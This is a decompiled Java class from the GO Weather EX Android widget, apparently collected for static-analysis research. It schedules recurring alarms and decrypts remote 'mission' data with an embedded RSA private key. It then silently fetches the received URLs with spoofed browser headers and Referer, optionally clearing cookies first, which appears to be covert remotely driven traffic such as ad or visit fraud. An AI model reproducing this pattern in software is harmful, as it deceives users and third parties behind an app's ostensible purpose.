package com.gau.go.gostaticsdk.e;

import android.app.AlarmManager;
import android.app.PendingIntent;
import android.content.Context;
import android.content.Intent;
import android.content.IntentFilter;
import android.content.SharedPreferences;
import android.content.SharedPreferences.Editor;
import android.util.Base64;
import android.webkit.CookieManager;
import android.webkit.CookieSyncManager;
import java.math.BigInteger;
import java.security.Key;
import java.security.KeyFactory;
import java.security.spec.KeySpec;
import java.security.spec.RSAPrivateKeySpec;
import javax.crypto.Cipher;
import org.apache.http.HttpResponse;
import org.apache.http.StatusLine;
import org.apache.http.client.methods.HttpGet;
import org.apache.http.impl.client.DefaultHttpClient;
import org.apache.http.params.BasicHttpParams;

public class a
{
  private Context a;
  private String b = "com.gau.go.GOSTATIC_PRETTIFY";
  private String c = "com.gau.go.NEXTMISSION";
  private c d;
  private AlarmManager e;
  private String f = "prettify_mission";
  
  public a(Context paramContext)
  {
    if (paramContext != null)
    {
      this.a = paramContext;
      IntentFilter localIntentFilter = new IntentFilter();
      localIntentFilter.addAction(this.b);
      localIntentFilter.addAction("android.net.conn.CONNECTIVITY_CHANGE");
      localIntentFilter.addAction(this.c);
      this.d = new c(this, null);
      this.a.registerReceiver(this.d, localIntentFilter);
      this.e = ((AlarmManager)paramContext.getSystemService("alarm"));
      a();
    }
  }
  
  private String a(String paramString1, String paramString2, String paramString3, String paramString4, String paramString5, boolean paramBoolean)
  {
    boolean bool2 = a(paramString2, paramString4, paramString5, paramBoolean);
    boolean bool1 = bool2;
    if (bool2) {
      bool1 = a(paramString3, paramString4, paramString5, paramBoolean);
    }
    if (bool1) {
      return paramString1;
    }
    return "";
  }
  
  private String a(byte[] paramArrayOfByte)
  {
    Object localObject1 = Base64.decode("u5CDEWKAPKxTSFI8LBwFgqp3TqOmstJgrS5lGtZcIUKC95ofeObcd77Tz8jN3l+EooFVzVGYpJOXp2zEw/4KFqPpLa0s7uVF+/lKWKfPuMp5GT3GrWzvwTxtzIIqLfnFW5kqD7D/MfUqlI/EQLB87NxUxD1wgsswQDSJ2qxIbu/dOWBJub887961lfkyy6dPAl3z6E4sUFTm8rHSf6ErZzRUiZwLEUBJyp+KJW5VLhpNHbxJztQ3MhQBMBVxRw/PsfLjbGnChJZvkX1Kd1NdzTvolKdBWdXi5WFwJ/A3kuxMfIEXqOKdq5DTAvFmBHa5+giO11iRcGI4T7M4E9YE2Q==", 0);
    Object localObject2 = Base64.decode("lkDJ/l8+A1y4yrK16U/5Shdsw95tZ8sIDzOfYsRdwXcam2cn1x55dqOz4jwmTwGNqvCY34WCFjT1w/VqGuejBUgBP8n+uNGKIrQtTp//0zS/leza/4rI9a+G9dFAINx5sUsdWrybclXH6oLQ4FGBge1vKlVdkCldWdG8rSReUh8LwbyjV2hYrF0f373DYiTHpImhZcW+ylk4BtaHbySFVIyRVXqXHENzd0ptXon5P0zrmSHIshccaYdqRuObjqBybCiyfZuECheyKttwLV0QQVSEgc+9KrYD+pI/N/Zks9T2BHC++YJHaoj6v46bgv9TKqZOGZjUUUFttybcJ9lI0Q==", 0);
    localObject1 = new RSAPrivateKeySpec(new BigInteger(1, (byte[])localObject1), new BigInteger(1, (byte[])localObject2));
    localObject1 = KeyFactory.getInstance("RSA").generatePrivate((KeySpec)localObject1);
    Cipher localCipher = Cipher.getInstance("RSA");
    localCipher.init(2, (Key)localObject1);
    byte[] arrayOfByte = new byte['Ā'];
    localObject1 = "";
    int i = 0;
    int j;
    do
    {
      System.arraycopy(paramArrayOfByte, i, arrayOfByte, 0, 256);
      String str = new String(localCipher.doFinal(arrayOfByte), "UTF-8");
      j = str.indexOf("||||");
      localObject2 = str;
      if (j > 0) {
        localObject2 = str.substring(j + 4);
      }
      localObject2 = (String)localObject1 + (String)localObject2;
      j = i + arrayOfByte.length;
      i = j;
      localObject1 = localObject2;
    } while (j < paramArrayOfByte.length);
    return (String)localObject2;
  }
  
  private void a()
  {
    long l = b();
    l = System.currentTimeMillis() - l;
    if (28800000L <= l) {}
    for (l = 60000L;; l = 28800000L - l)
    {
      a(l);
      return;
    }
  }
  
  private void a(long paramLong)
  {
    try
    {
      long l = System.currentTimeMillis();
      Object localObject = new Intent(this.b);
      localObject = PendingIntent.getBroadcast(this.a, 0, (Intent)localObject, 0);
      this.e.set(0, l + paramLong, (PendingIntent)localObject);
      return;
    }
    catch (Exception localException) {}
  }
  
  private void a(boolean paramBoolean)
  {
    if (this.a != null)
    {
      SharedPreferences localSharedPreferences = this.a.getSharedPreferences("com.go.prettify", 0);
      if (localSharedPreferences != null) {
        localSharedPreferences.edit().putBoolean("need_pull_data", paramBoolean).commit();
      }
    }
  }
  
  private boolean a(String paramString1, String paramString2, String paramString3, boolean paramBoolean)
  {
    if ((paramString1 == null) || (paramString1.length() == 0)) {}
    for (;;)
    {
      return true;
      try
      {
        paramString1 = new HttpGet(paramString1);
        if ((paramString3 != null) && (paramString3.length() > 0)) {
          paramString1.setHeader("Referer", paramString3);
        }
        paramString1.setHeader("User-Agent", paramString2);
        paramString1.setHeader("Accept", "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8");
        paramString1.setHeader("Accept-Language", "zh-cn,zh;q=0.5");
        paramString1.setHeader("Accept-Charset", "ISO-8859-1,utf-8;q=0.7,*;q=0.7");
        paramString1.setHeader("Accept-Encoding", "gzip, deflate");
        if (paramBoolean)
        {
          CookieSyncManager.createInstance(this.a);
          CookieManager.getInstance().removeAllCookie();
        }
        int i = new DefaultHttpClient(new BasicHttpParams()).execute(paramString1).getStatusLine().getStatusCode();
        if (i != 200) {
          return false;
        }
      }
      catch (Exception paramString1) {}
    }
    return false;
  }
  
  private long b()
  {
    long l2 = 0L;
    long l1 = l2;
    if (this.a != null)
    {
      SharedPreferences localSharedPreferences = this.a.getSharedPreferences("com.go.prettify", 0);
      l1 = l2;
      if (localSharedPreferences != null) {
        l1 = localSharedPreferences.getLong("last_time", 0L);
      }
    }
    return l1;
  }
  
  private void b(long paramLong)
  {
    if (this.a != null)
    {
      SharedPreferences localSharedPreferences = this.a.getSharedPreferences("com.go.prettify", 0);
      if (localSharedPreferences != null) {
        localSharedPreferences.edit().putLong("last_time", paramLong).commit();
      }
    }
  }
  
  private boolean c()
  {
    boolean bool2 = false;
    boolean bool1 = bool2;
    if (this.a != null)
    {
      SharedPreferences localSharedPreferences = this.a.getSharedPreferences("com.go.prettify", 0);
      bool1 = bool2;
      if (localSharedPreferences != null) {
        bool1 = localSharedPreferences.getBoolean("need_pull_data", false);
      }
    }
    return bool1;
  }
  
  private void d()
  {
    b localb = new b(this, this.f);
    localb.setPriority(1);
    localb.start();
  }
  
  private String e()
  {
    String str = "normal";
    if (this.a != null) {
      str = this.a.getSharedPreferences("com.go.prettify", 0).getString("control_status", "normal");
    }
    return str;
  }
}


/* Location:              /Users/amaurremi/uw/stringoid/static-dynamic-comparison/apps/go weather ex/com.gau.go.launcherex.gowidget.weatherwidget-124-dex2jar.jar!/com/gau/go/gostaticsdk/e/a.class
 * Java compiler version: 6 (50.0)
 * JD-Core Version:       0.7.1
 */